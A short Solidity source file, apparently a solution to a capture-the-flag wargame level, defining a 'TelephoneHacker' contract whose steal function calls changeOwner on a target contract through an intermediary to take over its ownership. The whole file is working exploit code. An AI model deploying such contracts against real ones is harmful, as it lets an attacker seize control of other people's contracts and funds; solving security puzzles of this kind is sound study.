// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ITelephone {
  function changeOwner(address _owner) public {}
}

contract TelephoneHacker {
  ITelephone telephone;

  constructor(address _telContract) {
    telephone = ITelephone(_telContract);
  }

  function steal() public {
    telephone.changeOwner(msg.sender);
  }
}